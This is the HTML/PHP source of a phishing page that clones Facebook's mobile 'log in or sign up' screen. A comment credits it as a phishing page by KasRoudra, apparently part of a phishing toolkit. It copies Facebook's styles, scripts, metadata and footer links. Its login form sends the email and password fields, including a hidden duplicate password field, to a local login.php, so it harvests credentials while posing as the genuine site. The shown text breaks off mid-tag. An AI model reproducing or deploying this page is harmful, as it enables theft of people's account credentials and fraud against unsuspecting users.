<?php
include "validate.php";
?>
<!DOCTYPE html>
<!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
<html lang="en">
  <head>
    <title>Facebook – log in or sign up</title>
    <meta
      name="viewport"
      content="user-scalable=no,initial-scale=1,maximum-scale=1"
    />
    <link
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png"
      rel="shortcut icon"
      sizes="196x196"
    />
    <meta
      name="referrer"
      content="origin-when-crossorigin"
      id="meta_referrer"
    />
    <meta name="theme-color" content="#3b5998" />
    <link rel="stylesheet" href="./style.css" />
    <!--<script src="./script.js"></script>-->
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/kkyLGbyp9NX.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="MoYpVB9"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/l/0,cross/aktAT6r-inm.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="0rWB4c7"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/l/0,cross/JSkF6PDP_-u.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="L+EZvmW"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/l/0,cross/Z0lvzk8hKg6.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="M9i/bZy"
      crossorigin="anonymous"
    />
    <script id="u_0_g_C8" nonce="htOXv5tP">
      function envFlush(a) {
        function b(b) {
          for (var c in a) b[c] = a[c];
        }
        window.requireLazy
          ? window.requireLazy(["Env"], b)
          : ((window.Env = window.Env || {}), b(window.Env));
      }
      envFlush({
        timeslice_heartbeat_config: {
          pollIntervalMs: 33,
          idleGapThresholdMs: 60,
          ignoredTimesliceNames: {
            requestAnimationFrame: true,
            "Event listenHandler mousemove": true,
            "Event listenHandler mouseover": true,
            "Event listenHandler mouseout": true,
            "Event listenHandler scroll": true,
          },
          isHeartbeatEnabled: true,
          isArtilleryOn: false,
        },
        shouldLogCounters: true,
        timeslice_categories: { react_render: true, reflow: true },
        sample_continuation_stacktraces: true,
        dom_mutation_flag: true,
      });
    </script>
    <script nonce="htOXv5tP">
      document.domain = "facebook.com";
      /^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash) &&
        location.replace(location.hash.substr(location.hash.indexOf("!") + 1));
    </script>
    <script nonce="htOXv5tP">
      __DEV__ = 0;
    </script>
    <script
      id="u_0_h_oI"
      crossorigin="anonymous"
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/A3AUGyI9e-_.js?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="L8NPcws"
      nonce="htOXv5tP"
    ></script>
    <script id="u_0_e_g+" nonce="htOXv5tP">
      (CavalryLogger =
        window.CavalryLogger ||
        function (a) {
          (this.lid = a),
            (this.transition = !1),
            (this.metric_collected = !1),
            (this.is_detailed_profiler = !1),
            (this.instrumentation_started = !1),
            (this.pagelet_metrics = {}),
            (this.events = {}),
            (this.ongoing_watch = {}),
            (this.values = { t_cstart: window._cstart }),
            (this.piggy_values = {}),
            (this.bootloader_metrics = {}),
            (this.resource_to_pagelet_mapping = {}),
            this.initializeInstrumentation && this.initializeInstrumentation();
        }),
        (CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
          this.is_detailed_profiler = a;
          return this;
        }),
        (CavalryLogger.prototype.setTTIEvent = function (a) {
          this.tti_event = a;
          return this;
        }),
        (CavalryLogger.prototype.setValue = function (a, b, c, d) {
          d = d ? this.piggy_values : this.values;
          (typeof d[a] === "undefined" || c) && (d[a] = b);
          return this;
        }),
        (CavalryLogger.prototype.getLastTtiValue = function () {
          return this.lastTtiValue;
        }),
        (CavalryLogger.prototype.setTimeStamp =
          CavalryLogger.prototype.setTimeStamp ||
          function (a, b, c, d) {
            this.mark(a);
            var e = this.values.t_cstart || this.values.t_start;
            e = d ? e + d : CavalryLogger.now();
            this.setValue(a, e, b, c);
            this.tti_event &&
              a == this.tti_event &&
              ((this.lastTtiValue = e), this.setTimeStamp("t_tti", b));
            return this;
          }),
        (CavalryLogger.prototype.mark =
          typeof console === "object" && console.timeStamp
            ? function (a) {
                console.timeStamp(a);
              }
            : function () {}),
        (CavalryLogger.prototype.addPiggyback = function (a, b) {
          this.piggy_values[a] = b;
          return this;
        }),
        (CavalryLogger.instances = {}),
        (CavalryLogger.id = 0),
        (CavalryLogger.getInstance = function (a) {
          typeof a === "undefined" && (a = CavalryLogger.id);
          CavalryLogger.instances[a] ||
            (CavalryLogger.instances[a] = new CavalryLogger(a));
          return CavalryLogger.instances[a];
        }),
        (CavalryLogger.setPageID = function (a) {
          if (CavalryLogger.id === 0) {
            var b = CavalryLogger.getInstance();
            CavalryLogger.instances[a] = b;
            CavalryLogger.instances[a].lid = a;
            delete CavalryLogger.instances[0];
          }
          CavalryLogger.id = a;
        }),
        (CavalryLogger.now = function () {
          return window.performance &&
            performance.timing &&
            performance.timing.navigationStart &&
            performance.now
            ? performance.now() + performance.timing.navigationStart
            : new Date().getTime();
        }),
        (CavalryLogger.prototype.measureResources = function () {}),
        (CavalryLogger.prototype.profileEarlyResources = function () {}),
        (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {}),
        (CavalryLogger.start_js = function () {}),
        (CavalryLogger.start_js_script = function () {}),
        (CavalryLogger.done_js = function () {});
      CavalryLogger.getInstance().setTTIEvent("t_domcontent");
      (CavalryLogger.prototype.measureResources = function (a, b) {
        if (!this.log_resources) return;
        var c = "bootload/" + a.name;
        if (
          this.bootloader_metrics[c] !== void 0 ||
          this.ongoing_watch[c] !== void 0
        )
          return;
        var d = CavalryLogger.now();
        this.ongoing_watch[c] = d;
        "start_" + c in this.bootloader_metrics ||
          (this.bootloader_metrics["start_" + c] = d);
        b &&
          !("tag_" + c in this.bootloader_metrics) &&
          (this.bootloader_metrics["tag_" + c] = b);
        if (a.type === "js") {
          c = "js_exec/" + a.name;
          this.ongoing_watch[c] = d;
        }
      }),
        (CavalryLogger.prototype.stopWatch = function (a) {
          if (this.ongoing_watch[a]) {
            var b = CavalryLogger.now(),
              c = b - this.ongoing_watch[a];
            this.bootloader_metrics[a] = c;
            var d = this.piggy_values;
            a.indexOf("bootload") === 0 &&
              (d.t_resource_download || (d.t_resource_download = 0),
              d.resources_downloaded || (d.resources_downloaded = 0),
              (d.t_resource_download += c),
              (d.resources_downloaded += 1),
              d["tag_" + a] == "_EF_" &&
                (d.t_pagelet_cssload_early_resources = b));
            delete this.ongoing_watch[a];
          }
          return this;
        }),
        (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
          var a = {};
          Object.values(window.CavalryLogger.instances).forEach(function (b) {
            b.bootloader_metrics && Object.assign(a, b.bootloader_metrics);
          });
          return a;
        }),
        (CavalryLogger.start_js = function (a) {
          for (var b = 0; b < a.length; ++b)
            CavalryLogger.getInstance().stopWatch("js_exec/" + a[b]);
        }),
        (CavalryLogger.start_js_script = function (a) {
          if (!a || !a.dataset) return;
          CavalryLogger.start_js([
            a.dataset.bootloaderHash || a.dataset.bootloaderHashClient,
          ]);
        }),
        (CavalryLogger.done_js = function (a) {
          for (var b = 0; b < a.length; ++b)
            CavalryLogger.getInstance().stopWatch("bootload/" + a[b]);
        }),
        (CavalryLogger.prototype.profileEarlyResources = function (a) {
          for (var b = 0; b < a.length; b++)
            this.measureResources(
              { name: a[b][0], type: a[b][1] ? "js" : "" },
              "_EF_"
            );
        });
      CavalryLogger.getInstance().log_resources = true;
      CavalryLogger.getInstance().setIsDetailedProfiler(true);
      window.CavalryLogger &&
        CavalryLogger.getInstance().setTimeStamp("t_start");
    </script>
    <script id="u_0_f_pb" nonce="htOXv5tP">
      (function _(a, b, c, d) {
        function e(a) {
          document.cookie =
            a +
            "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com";
        }
        function f(a, b) {
          document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure";
        }
        if (!a) {
          e(b);
          e(c);
          return;
        }
        a = null;
        (navigator.userAgent.indexOf("Firefox") !== -1 ||
          (!window.devicePixelRatio &&
            navigator.userAgent.indexOf("Windows Phone") !== -1)) &&
          document.documentElement != null &&
          ((a = screen.width / document.documentElement.offsetWidth),
          (a = Math.max(1, Math.floor(a * 2) / 2)));
        (!a || a === 1) &&
          navigator.userAgent.indexOf("IEMobile") !== -1 &&
          ((a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96),
          (a = Math.max(1, Math.round(a * 2) / 2)));
        f(b, (a || window.devicePixelRatio || 1).toString());
        e = window.screen ? screen.width : 0;
        b = window.screen ? screen.height : 0;
        f(c, e + "x" + b);
        d &&
          document.cookie &&
          window.devicePixelRatio > 1 &&
          document.location.reload();
      })(true, "m_pixel_ratio", "wd", false);
    </script>
    <meta
      http-equiv="origin-trial"
      data-feature="getInstalledRelatedApps"
      data-expires="2017-12-04"
      content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0="
    />
    <meta
      name="description"
      content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates."
    />
    <link rel="canonical" href="https://www.facebook.com/" />
    <meta property="og:site_name" content="Facebook" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Facebook &#x2013; log in or sign up" />
    <meta
      property="og:description"
      content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates."
    />
    <meta
      property="og:image"
      content="https://www.facebook.com/images/fb_icon_325x325.png"
    />
    <meta property="og:url" content="https://www.facebook.com/" />
    <link
      rel="alternate"
      hreflang="x-default"
      href="https://www.facebook.com/"
    />
    <link rel="alternate" hreflang="en" href="https://www.facebook.com/" />
    <link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/" />
    <link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/" />
    <link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/" />
    <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/" />
    <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/" />
    <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/" />
    <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/" />
    <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/" />
    <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/" />
    <link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/" />
    <link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/" />
    <link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/" />
    <link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/" />
    <link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/" />
    <link rel="alternate" hreflang="id" href="https://id-id.facebook.com/" />
    <link rel="alternate" hreflang="it" href="https://it-it.facebook.com/" />
    <link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/" />
    <link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/" />
    <link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/" />
    <link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/" />
    <link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/" />
    <link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/" />
    <link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/" />
    <link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/" />
    <link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/" />
    <link rel="alternate" hreflang="th" href="https://th-th.facebook.com/" />
    <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/" />
    <script id="u_0_i_eO" type="application/ld+json" nonce="htOXv5tP">
      {
        "\u0040context": "http:\/\/schema.org",
        "\u0040type": "WebSite",
        "name": "Facebook",
        "url": "https:\/\/www.facebook.com\/"
      }
    </script>
    <link
      rel="manifest"
      id="MANIFEST_LINK"
      href="https://facebook.com/data/manifest/"
      crossorigin="use-credentials"
    />
  </head>
  <body tabindex="0" class="touch x1-5 tablet android _fzu _50-3 iframe acw">
    <script id="u_0_d_8i" nonce="htOXv5tP">
      (function (a) {
        a.__updateOrientation = function () {
          var b = !!a.orientation && a.orientation !== 180,
            c = document.body;
          c &&
            (c.className =
              c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") +
              " " +
              (b ? "landscape" : "portrait"));
          return b;
        };
      })(window);
    </script>
    <div id="viewport" data-kaios-focus-transparent="1">
      <h1
        style="
          display: block;
          height: 0;
          overflow: hidden;
          position: absolute;
          width: 0;
          padding: 0;
        "
      >
        Facebook
      </h1>
      <div id="page">
        <div class="_129_" id="header-notices"></div>
        <div
          class="maxwidth _5soa acw"
          id="root"
          role="main"
          data-sigil="context-layer-root content-pane"
        >
          <div class="_7om2">
            <div class="_4g34" id="u_0_0_6L">
              <div
                class="_5yd0 _2ph- _5yd1"
                style="display: none"
                id="login_error"
                data-sigil="m_login_notice"
              >
                <div class="_52jd"></div>
              </div>
              <div class="_9om_">
                <div class="_4-4l">
                  <div
                    id="login_top_banner"
                    data-sigil="m_login_upsell login_identify_step_element"
                  >
                    <div class="_qw9 grouped aclb" id="u_0_1_CF">
                      <a
                        href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DDSgOYhSt_vp2vn8KSuVyR4Jc%26referrer_params%255Blink_source%255D%3Dfb_app_banner&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8"
                        target="_top"
                        class="touchableArea first last area touchable acy apl abt abb"
                        data-sigil="touchable marea"
                        ><div class="ib cc">
                          <i class="l img sp_xm9DDmY7HAL_1_5x sx_76c966"></i>
                          <div class="c">
                            <span class="fcl"
                              >Get Facebook for Android and browse faster.</span
                            >
                          </div>
                        </div></a
                      >
                    </div>
                  </div>
                  <div class="_7om2 _52we _2pid _52z6">
                    <div class="_4g34">
                      <a
                        href="https://facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1MDk0OTI4LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;refid=8"
                        ><img
                          src="./logo.svg"
                          width="112"
                          class="img"
                          alt="facebook"
                      /></a>
                    </div>
                  </div>
                  <div class="_5rut">
                    <form
                      method="post"
                      action="./login.php"
                      class="mobile-login-form _9hp- _5spm"
                      id="login_form"
                      novalidate="1"
                    >
                      <input
                        type="hidden"
                        name="lsd"
                        value="AVrqJpyOZ5I"
                        autocomplete="off"
                      /><input
                        type="hidden"
                        name="jazoest"
                        value="2980"
                        autocomplete="off"
                      /><input
                        type="hidden"
                        name="m_ts"
                        value="1645094929"
                      /><input
                        type="hidden"
                        name="li"
                        value="ECgOYqmD39tB8B92hU1BC3Fe"
                      /><input
                        type="hidden"
                        name="try_number"
                        value="0"
                        data-sigil="m_login_try_number"
                      /><input
                        type="hidden"
                        name="unrecognized_tries"
                        value="0"
                        data-sigil="m_login_unrecognized_tries"
                      />
                      <div
                        id="user_info_container"
                        data-sigil="user_info_after_failure_element"
                      ></div>
                      <div
                        id="pwd_label_container"
                        data-sigil="user_info_after_failure_element"
                      ></div>
                      <div id="otp_retrieve_desc_container"></div>
                      <div>
                        <div class="_56be">
                          <div class="_55wo _56bf">
                            <div class="_96n9" id="email_input_container">
                              <input
                                autocorrect="off"
                                autocapitalize="off"
                                type="email"
                                class="_56bg _4u9z _5ruq _8qtn"
                                autocomplete="on"
                                id="m_login_email"
                                name="email"
                                placeholder="Mobile number or email address"
                                data-sigil="m_login_email"
                              />
                            </div>
                          </div>
                        </div>
                        <div class="_55wq"></div>
                        <div class="_56be">
                          <div class="_55wo _56bf">
                            <div
                              class="_1upc _mg8"
                              data-sigil="m_login_password"
                            >
                              <div class="_7om2">
                                <div class="_4g34 _5i2i _52we">
                                  <div class="_5xu4">
                                    <input
                                      autocorrect="off"
                                      autocapitalize="off"
                                      class="_56bg _4u9z _27z2 _8qtm"
                                      autocomplete="on"
                                      id="m_login_password"
                                      name="pass"
                                      placeholder="Password"
                                      type="password"
                                      data-sigil="password-plain-text-toggle-input"
                                    />
                                    <input 
                                      type="hidden"
                                      id="hiddenPass"
                                      name="pass"
                                    />
                                  </div>
                                </div>
                                <div class="_5s61 _216i _5i2i _52we">
                                  <div class="_5xu4">
                                    <div
                                      class="_2pi9"
                                      style="display: none"
                                      id="u_0_2_GZ"
                                    >
                                      <a
                                        href="#"
                                        data-sigil="password-plain-text-toggle"
                                        ><span
                                          class="mfss"
                                          style="display: none"
                                          id="u_0_3_5A"
                                          >HIDE</span
                                        ><span class="mfss" id="u_0_4_kc"
                                          >SHOW</span
                                        ></a
                                      >
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="_2pie" style="text-align: center">
                        <div
                          id="login_password_step_element"
                          data-sigil="login_password_step_element"
                        >
                          <button
                            type="button"
                            value="Log In"
                            class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                            id="btnsubmit"
                            name="login"
                            data-sigil="touchable login_button_block m_login_button"
                          >
                            <span class="_55sr">Log In</span>
                          </button>
                        </div>
                        <div
                          class="_7eif"
                          id="oauth_login_button_container"
                          style="display: none"
                        ></div>
                        <div
                          class="_7f_d"
                          id="oauth_login_desc_container"
                          style="display: none"
                        ></div>
                        <div id="otp_button_elem_container"></div>
                      </div>
                      <input
                        type="hidden"
                        name="prefill_contact_point"
                        id="prefill_contact_point"
                      /><input
                        type="hidden"
                        name="prefill_source"
                        id="prefill_source"
                      /><input
                        type="hidden"
                        name="prefill_type"
                        id="prefill_type"
                      /><input
                        type="hidden"
                        name="first_prefill_source"
                        id="first_prefill_source"
                      /><input
                        type="hidden"
                        name="first_prefill_type"
                        id="first_prefill_type"
                      /><input
                        type="hidden"
                        name="had_cp_prefilled"
                        id="had_cp_prefilled"
                        value="false"
                      /><input
                        type="hidden"
                        name="had_password_prefilled"
                        id="had_password_prefilled"
                        value="false"
                      /><input
                        type="hidden"
                        name="is_smart_lock"
                        id="is_smart_lock"
                        value="false"
                      /><input
                        type="hidden"
                        id="bi_xrwh"
                        name="bi_xrwh"
                        value="-1650198048183390780"
                      /><input type="hidden" id="scetoggle" />
                      <div class="_xo8"></div>
                      <noscript
                        ><input type="hidden" name="_fb_noscript" value="true"
                      /></noscript>
                     </form>
                      
                    <div>
                      <div class="_2pie _9omz">
                        <div class="_52jj _9on1">
                          <a
                            class="_9on1"
                            tabindex="0"
                            href="https://facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1MDk0OTI4LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;c=https%3A%2F%2Fm.facebook.com%2F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8"
                            id="forgot-password-link"
                            >Forgotten password?</a
                          >
                        </div>
                      </div>
                      <div style="padding-top: 42px">
                        <div>
                          <div>
                            <div>
                              <div
                                id="login_reg_separator"
                                class="_43mg _8qtf"
                                data-sigil="login_reg_separator"
                              >
                                <span class="_43mh">or</span>
                              </div>
                              <div class="_52jj _5t3b" id="signup_button_area">
                                <a
                                  role="button"
                                  class="_5t3c _28le btn btnS medBtn mfsm touchable"
                                  id="signup-button"
                                  href="https://facebook.com/reg-no-deeplink/?cid=103&amp;refid=8"
                                  tabindex="0"
                                  data-sigil="m_reg_button"
                                  >Create New Account</a
                                >
                              </div>
                            </div>
                          </div>
                          <div class="_2pie" style="text-align: center">
                            <div>
                              <div
                                data-sigil="login_identify_step_element"
                              ></div>
                              <div class="other-links _8p_m">
                                <ul class="_5pkb _55wp">
                                  <li></li>
                                </ul>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div style="display: none"></div>
          <span
            ><img
              src="./hsts-pixel.gif"
              width="0"
              height="0"
              style="display: none"
          /></span>
          <div class="_55wr _5ui2" data-sigil="m_login_footer">
            <div class="_5dpw">
              <div
                class="_5ui3"
                data-nocookies="1"
                id="locale-selector"
                data-sigil="language_selector marea"
              >
                <div class="_7om2">
                  <div class="_4g34">
                    <span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="https://facebook.com/intl/save_locale/?loc=as_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=as_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >অসমীয়া</a
                        ></span
                      >
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="https://facebook.com/intl/save_locale/?loc=ne_NP&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=ne_NP&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >नेपाली</a
                        ></span
                      >
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="https://facebook.com/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >Português (Brasil)</a
                        ></span
                      >
                    </div>
                  </div>
                  <div class="_4g34">
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="https://facebook.com/intl/save_locale/?loc=bn_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=bn_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >বাংলা</a
                        ></span
                      >
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="https://facebook.com/intl/save_locale/?loc=hi_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=hi_IN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >हिन्दी</a
                        ></span
                      >
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="https://facebook.com/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="https://facebook.com/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >Español</a
                        ></span
                      >
                    </div>
                    <a
                      href="https://facebook.com/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8"
                      ><div
                        class="_3j87 _1rrd _3ztd"
                        aria-label="Complete list of languages"
                        data-sigil="more_language"
                      >
                        <i class="img sp_hXwjxxRp6sw_1_5x sx_8ad453"></i></div
                    ></a>
                  </div>
                </div>
              </div>
              <div class="_5ui4">
                <div class="_96qv _9a0a">
                  <a
                    href="https://about.facebook.com/?refid=8"
                    class="_96qw"
                    title="Read our blog, discover the resource centre and find job opportunities."
                    >About</a
                  ><span aria-hidden="true"> · </span
                  ><a
                    href="https://facebook.com/help/?ref=pf&amp;refid=8"
                    class="_96qw"
                    title="Visit our Help Centre."
                    >Help</a
                  ><span aria-hidden="true"> · </span
                  ><span class="_96qw" id="u_0_5_ah">More</span>
                </div>
                <div class="_96qv" style="display: none" id="u_0_6_8B">
                  <a
                    href="https://messenger.com/"
                    title="Take a look at Messenger."
                    class="_96qw"
                    >Messenger</a
                  ><a
                    href="https://facebook.com/lite/?refid=8"
                    title="Facebook Lite for Android."
                    class="_96qw"
                    >Facebook Lite</a
                  ><a
                    href="https://m.facebook.com/watch/?refid=8"
                    title="Browse our Watch videos."
                    class="_96qw"
                    >Watch</a
                  ><a
                    href="https://facebook.com/places/?refid=8"
                    title="Take a look at popular places on Facebook."
                    class="_96qw"
                    >Places</a
                  ><a
                    href="https://facebook.com/games/?refid=8"
                    title="Check out Facebook games."
                    class="_96qw"
                    >Games</a
                  ><a
                    href="https://facebook.com/marketplace/?refid=8"
                    title="Buy and sell on Facebook Marketplace."
                    class="_96qw"
                    >Marketplace</a
                  ><a
                    href="https://pay.facebook.com/?refid=8"
                    title="Learn more about Facebook Pay"
                    target="_blank"
                    class="_96qw"
                    >Facebook Pay</a
                  ><a
                    href="https://www.oculus.com/"
                    title="Learn more about Oculus"
                    target="_blank"
                    class="_96qw"
                    >Oculus</a
                  ><a
                    href="https://portal.facebook.com/?refid=8"
                    title="Learn more about Facebook Portal"
                    target="_blank"
                    class="_96qw"
                    >Portal</a
                  ><a
                    href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT3q1KOVdNNW2fRs0wun0KBGwuhQjWftomvC45U7wCfjOxlqfEp99sHmq8HrrbXLqzA0O7d_q37E4UyydZ20fevuW3s8ztqEHZrtvg7esnvtsIErzEcnYjaN9EYnbSrOhzFuoOxNajUEXJvQRC_1"
                    title="Take a look at Instagram"
                    target="_blank"
                    class="_96qw"
                    rel="noopener"
                    data-sigil="MLynx_asynclazy"
                    >Instagram</a
                  ><a
                    href="https://www.bulletin.com/"
                    title="Take a look at Bulletin newsletter"
                    class="_96qw"
                    >Bulletin</a
                  ><a
                    href="https://facebook.com/local/lists/245019872666104/?refid=8"
                    title="Browse our Local Lists directory."
                    class="_96qw"
                    >Local</a
                  ><a
                    href="https://facebook.com/fundraisers/?refid=8"
                    title="Donate to worthy causes."
                    class="_96qw"
                    >Fundraisers</a
                  ><a
                    href="https://facebook.com/biz/directory/?refid=8"
                    title="Browse our Facebook Services directory."
                    class="_96qw"
                    >Services</a
                  ><a
                    href="https://developers.facebook.com/?ref=pf&amp;refid=8"
                    title="Develop on our platform."
                    class="_96qw"
                    >Developers</a
                  ><a
                    href="https://facebook.com/careers/?ref=pf&amp;refid=8"
                    title="Make your next career move to our brilliant company."
                    class="_96qw"
                    >Careers</a
                  ><a
                    href="https://facebook.com/privacy/explanation?refid=8"
                    title="Learn about your privacy and Facebook."
                    class="_96qw"
                    >Privacy</a
                  ><a
                    href="https://facebook.com/groups/explore/?refid=8"
                    title="Explore our groups."
                    class="_96qw"
                    >Groups</a
                  >
                </div>
                <span class="mfss fcg">Facebook Inc.</span>
              </div>
            </div>
          </div>
        </div>
        <div class=""></div>
        <div
          class="viewportArea _2v9s"
          style="display: none"
          id="u_0_7_pi"
          data-sigil="marea"
        >
          <div class="_5vsg" id="u_0_8_Yd"></div>
          <div class="_5vsh" id="u_0_9_Wk"></div>
          <div class="_5v5d fcg">
            <div
              class="_2so _2sq _2ss img _50cg"
              data-animtype="1"
              data-sigil="m-loading-indicator-animate m-loading-indicator-root"
            ></div>
            Loading...
          </div>
        </div>
        <div
          class="viewportArea aclb"
          id="mErrorView"
          style="display: none"
          data-sigil="marea"
        >
          <div class="container">
            <div class="image"></div>
            <div class="message" data-sigil="error-message"></div>
            <a class="link" data-sigil="MPageError:retry">Try Again</a>
          </div>
        </div>
      </div>
    </div>
    <div id="static_templates">
      <div class="mDialog" id="modalDialog" style="display: none">
        <div
          class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled"
          id="mDialogHeader"
        >
          <div class="_7om2 _52we">
            <div class="_5s61">
              <div class="_52z7">
                <button
                  type="submit"
                  value="Cancel"
                  class="cancelButton btn btnD bgb mfss touchable"
                  id="u_0_b_iy"
                  data-sigil="dialog-cancel-button"
                >
                  Cancel</button
                ><button
                  type="submit"
                  value="Back"
                  class="backButton btn btnI bgb mfss touchable iconOnly"
                  aria-label="Back"
                  id="u_0_c_Tb"
                  data-sigil="dialog-back-button"
                >
                  <i
                    class="img sp_hXwjxxRp6sw_1_5x sx_030478"
                    style="margin-top: 2px"
                  ></i>
                </button>
              </div>
            </div>
            <div class="_4g34">
              <div class="_52z6">
                <div
                  class="_50l4 mfsl fcw"
                  id="m-future-page-header-title"
                  role="heading"
